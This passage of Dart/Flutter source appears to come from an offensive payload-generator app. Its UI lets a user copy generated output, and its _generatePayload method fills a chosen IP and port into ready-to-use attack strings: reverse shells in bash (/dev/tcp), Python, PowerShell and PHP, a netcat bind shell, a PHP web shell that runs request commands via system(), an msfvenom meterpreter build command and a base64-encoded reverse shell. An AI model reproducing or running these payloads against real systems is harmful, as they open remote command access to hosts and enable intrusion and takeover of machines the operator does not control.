                          onPressed: () {
                            Clipboard.setData(ClipboardData(text: _payloadController.text));
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(content: Text('Payload copied to clipboard')),
                            );
                          },
                        ),
                      ],
                    ),
                  ),
                  Expanded(
                    child: TextField(
                      controller: _payloadController,
                      decoration: const InputDecoration(
                        border: InputBorder.none,
                        contentPadding: EdgeInsets.all(16),
                        hintText: 'Generated payload will appear here...',
                      ),
                      style: const TextStyle(fontFamily: 'monospace'),
                      maxLines: null,
                      expands: true,
                      readOnly: true,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  void _generatePayload() {
    final ip = _ipController.text;
    final port = _portController.text;
    String payload = '';

    switch (_selectedPayloadType) {
      case 'Reverse Shell':
        switch (_selectedPlatform) {
          case 'Linux':
            payload = 'bash -i >& /dev/tcp/$ip/$port 0>&1';
            break;
          case 'Python':
            payload = '''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$ip",$port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])''';
            break;
          case 'PowerShell':
            payload = '''\$client = New-Object System.Net.Sockets.TCPClient("$ip",$port)
\$stream = \$client.GetStream()
[byte[]]\$bytes = 0..65535|%{0}
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)
{
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i)
    \$sendback = (iex \$data 2>&1 | Out-String )
    \$sendback2 = \$sendback + "PS " + (pwd).Path + "> "
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2)
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length)
    \$stream.Flush()
}
\$client.Close()''';
            break;
          case 'PHP':
            payload = '''<?php
\$sock=fsockopen("$ip",$port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>''';
            break;
        }
        break;
      case 'Bind Shell':
        payload = 'nc -lvp $port -e /bin/bash';
        break;
      case 'Web Shell':
        payload = '''<?php
if(isset(\$_REQUEST['cmd'])){
    echo "<pre>";
    \$cmd = (\$_REQUEST['cmd']);
    system(\$cmd);
    echo "</pre>";
    die;
}
?>
<form method="GET" name="<?php echo basename(\$_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>''';
        break;
      case 'Meterpreter':
        payload = 'msfvenom -p $_selectedPlatform/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > payload.exe';
        break;
      case 'Encoded Payload':
        payload = 'echo "bash -i >& /dev/tcp/$ip/$port 0>&1" | base64';
        break;
    }

    setState(() {
      _payloadController.text = payload;
    });
  }
}